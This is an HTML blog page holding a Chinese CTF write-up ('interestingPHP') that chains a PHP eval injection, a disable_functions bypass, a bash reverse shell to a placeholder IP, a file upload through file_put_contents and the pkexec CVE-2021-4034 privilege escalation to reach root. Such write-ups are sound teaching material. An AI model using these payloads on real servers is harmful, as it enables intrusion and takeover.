@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>interestingPHP | css_0k的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="看到题目之后第一反应phpinfo()想查看环境和disabled_functions,无果，应该是被禁用了 不过可以用ini_get_all()函数，构造：exp&#x3D;print_r(ini_get_all()); 1[disable_functions] &#x3D;&gt; Array ( [global_value] &#x3D;&gt; include,include_once,require,require_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="interestingPHP">
+<meta property="og:url" content="https://css0k.github.io/2022/03/14/interestingPHP/index.html">
+<meta property="og:site_name" content="css_0k的博客">
+<meta property="og:description" content="看到题目之后第一反应phpinfo()想查看环境和disabled_functions,无果，应该是被禁用了 不过可以用ini_get_all()函数，构造：exp&#x3D;print_r(ini_get_all()); 1[disable_functions] &#x3D;&gt; Array ( [global_value] &#x3D;&gt; include,include_once,require,require_">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://css0k.github.io/2022/03/14/interestingPHP/Users/css/AppData/Roaming/Typora/typora-user-images/image-20220315000531657.png">
+<meta property="og:image" content="https://css0k.github.io/2022/03/14/interestingPHP/Users/css/AppData/Roaming/Typora/typora-user-images/image-20220314234315681.png">
+<meta property="og:image" content="https://css0k.github.io/2022/03/14/interestingPHP/Users/css/AppData/Roaming/Typora/typora-user-images/image-20220315002945422.png">
+<meta property="article:published_time" content="2022-03-14T11:31:31.000Z">
+<meta property="article:modified_time" content="2022-05-07T12:32:56.316Z">
+<meta property="article:author" content="css_0k">
+<meta property="article:tag" content="博客">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://css0k.github.io/2022/03/14/interestingPHP/Users/css/AppData/Roaming/Typora/typora-user-images/image-20220315000531657.png">
+  
+    <link rel="alternate" href="/atom.xml" title="css_0k的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">css_0k的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://css0k.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-interestingPHP" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/03/14/interestingPHP/" class="article-date">
+  <time datetime="2022-03-14T11:31:31.000Z" itemprop="datePublished">2022-03-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      interestingPHP
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>看到题目之后第一反应phpinfo()想查看环境和disabled_functions,无果，应该是被禁用了</p>
+<p>不过可以用ini_get_all()函数，构造：<code>exp=print_r(ini_get_all());</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[disable_functions] =&gt; <span class="keyword">Array</span> ( [global_value] =&gt; <span class="keyword">include</span>,<span class="keyword">include_once</span>,<span class="keyword">require</span>,<span class="keyword">require_once</span>,stream_get_contents,fwrite,readfile,file_get_contents,fread,fgets,fgetss,file,parse_ini_file,show_source,fsockopen,proc_open,ini_set,pfsockopen,ini_alter,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,dl,mail,stream_socket_client,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,get_cfg_var</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>stream_get_contents</code>被禁用了，蚁剑内置函数被禁了，蚁剑就不用想了</p>
+<p>直接get注入，<code>eval()</code>使用php函数遍历目录<code>scandir(&quot;./&quot;)</code>,<code>print_r()</code>使其格式输出</p>
+<p>发现目录中有<code>secret.rdb</code>，快，让我康康！<code>highlight_file(&quot;secret.rdb&quot;);</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``REDIS0008�  redis-ver4.0.9�redis-bits�@�ctime³��a�used-mem��aof-preamble���sercetye_w4nt_a_gir1fri3nd��nR�K��S</span><br></pre></td></tr></table></figure>
+
+<p>看官方wp发现遗漏了点东西  正好学习</p>
+<blockquote>
+<p><strong>AUTH password</strong></p>
+<p>通过设置配置文件中 <code>requirepass</code> 项的值(使用命令 <code>CONFIG SET requirepass password</code> )，可以使用密码来保护 Redis 服务器。</p>
+<p>如果开启了密码保护的话，在每次连接 Redis 服务器之后，就要使用 <code>AUTH</code> 命令解锁，解锁之后才能使用其他 Redis 命令。</p>
+<p>如果 <code>AUTH</code> 命令给定的密码 <code>password</code> 和配置文件中的密码相符的话，服务器会返回 <code>OK</code> 并开始接受命令输入。</p>
+<p>另一方面，假如密码不匹配的话，服务器将返回一个错误，并要求客户端需重新输入密码。</p>
+</blockquote>
+<p>猜测这个<code>ye_w4nt_a_gir1fri3nd</code>就是redis的auth（虽然下列方法并没用到）</p>
+<p>直接上bypass    <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">https://github.com/mm0r1/exploits</a></p>
+<p><img src="/2022/03/14/interestingPHP/Users\css\AppData\Roaming\Typora\typora-user-images\image-20220315000531657.png" alt="image-20220315000531657"></p>
+<p>然后将uname命令改为连接到云服务器进行操作的指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C端：</span><br><span class="line">	bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;端口号&gt; 0&gt;&amp;1&quot;</span><br><span class="line">S端：</span><br><span class="line">	nc -lvvn &lt;端口号&gt;</span><br></pre></td></tr></table></figure>
+
+<p>连接上之后搜索根目录发现flag  但是我们没有权限访问他</p>
+<p>所以现在应该干的事情就是越权   就是近期爆出的pkexec提权漏洞，直接拿出官方推荐：<a target="_blank" rel="noopener" href="https://github.com/">https://github.com/</a> arthepsy/CVE-2021-4034.gi</p>
+<p>接下来一通操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?exp=eval(file_put_contents(&quot;1.c&quot;,$_POST[&#x27;a&#x27;]));</span><br><span class="line"></span><br><span class="line">a=&lt;1.c文档内容&gt;</span><br></pre></td></tr></table></figure>
+
+<p>为了不让换行符影响文件的上传，我们最好编码后上传</p>
+<p>上传后在服务器端ls查看是否上传成功   最好用highlight_file(”1.c“)查看一下文件里是否写入内容</p>
+<p><img src="/2022/03/14/interestingPHP/Users\css\AppData\Roaming\Typora\typora-user-images\image-20220314234315681.png" alt="image-20220314234315681"></p>
+<p>最后就是编译执行这个文件的过程了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc 1.c -o 1</span><br><span class="line"></span><br><span class="line">./1           (chmod u+x 1)</span><br><span class="line"></span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/14/interestingPHP/Users\css\AppData\Roaming\Typora\typora-user-images\image-20220315002945422.png" alt="image-20220315002945422"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://css0k.github.io/2022/03/14/interestingPHP/" data-id="cl2w3h1i20008agw5fi8rgz6u" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/03/19/nsswp/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          nsswp
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/10/hvv/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">hvv</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc%E5%9B%BE%E7%89%87/" rel="tag">misc图片</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" rel="tag">图片隐写</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/misc%E5%9B%BE%E7%89%87/" style="font-size: 10px;">misc图片</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" style="font-size: 10px;">图片隐写</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/04/12/%E9%9A%90%E5%86%99%E9%A2%98%E6%80%9D%E8%B7%AF/">图片题思路</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/09/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E7%9F%A5%E8%AF%86/">图片隐写知识</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/05/1/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/04/php%E7%89%B9%E6%80%A7/">php特性</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/04/sqli-labs/">sqli-labs</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 css_0k<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
